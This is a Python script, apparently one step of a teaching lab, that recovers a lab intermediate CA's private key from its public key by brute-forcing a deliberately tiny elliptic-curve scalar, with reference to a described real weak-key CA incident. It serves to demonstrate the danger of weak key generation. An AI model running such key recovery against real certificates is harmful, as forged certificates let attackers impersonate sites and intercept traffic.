#!/usr/bin/env python3
"""
Step 2 -- Prove the key recovery is trivial.

Given ONLY the public key of the "compromised" intermediate CA, brute-force
the private scalar by multiplying the generator by candidate scalars until
the resulting point matches the public key.

This is exactly the technique available against the real eMudhra/emSign
intermediates: insufficient randomness during key generation produced
private scalars so small that recovery takes seconds on a laptop. In the
real incident, a researcher (credited as "Wayne") proved possession of all
eight keys by signing the message 'We have a problem here - Wayne'.

Optional: --bits N demos recovery of a larger weak scalar to show how far
up the range 'trivially weak' extends (32 bits still falls in seconds).
"""

import argparse
import os
import sys
import time

from cryptography import x509
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

from weak_ec import G, N, scalar_mul


def load_pub_point(cert_path):
    with open(cert_path, "rb") as f:
        cert = x509.load_pem_x509_certificate(f.read())
    pub = cert.public_key().public_bytes(Encoding.X962, PublicFormat.UncompressedPoint)
    # Uncompressed point: 0x04 || X (32 bytes) || Y (32 bytes)
    x = int.from_bytes(pub[1:33], "big")
    y = int.from_bytes(pub[33:65], "big")
    return (x, y)


def main():
    here = os.path.dirname(os.path.abspath(__file__))
    cert_path = os.path.join(here, "..", "trust", "lab-intermediate.pem")
    ap = argparse.ArgumentParser()
    ap.add_argument("--bits", type=int, default=0, help="demo with a random weak scalar of this bit size instead of the scalar-4 key")
    ap.add_argument("--cert", default=cert_path)
    args = ap.parse_args()

    if args.bits:
        import random

        d = random.getrandbits(args.bits) | 1
        print(f"[*] Simulating an intermediate whose scalar is only {args.bits} bits (d = {d})")
        target = scalar_mul(d, G)
        bound = 1 << args.bits
    else:
        print("[*] Loading public key of the 'compromised' intermediate from")
        print(f"    {os.path.relpath(args.cert)}")
        target = load_pub_point(args.cert)
        bound = 1 << 24  # we only expect pathologically small scalars

    print("[*] Brute-forcing private scalar: candidate d -> d*G == public key ?")
    t0 = time.perf_counter()
    found = None
    for d in range(1, bound):
        if scalar_mul(d, G) == target:
            found = d
            break
    dt = time.perf_counter() - t0
    if found is None:
        print(f"[-] Not found under 2^{max(args.bits, 24)} after {dt:.2f}s")
        return 1
    print(f"[+] PRIVATE KEY RECOVERED: d = {found}   (0x{found:x})")
    print(f"[+] recovered in {dt:.3f} seconds on this laptop, using only the PUBLIC key")
    print("[+] An attacker can now sign fraudulent certificates with this CA key.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
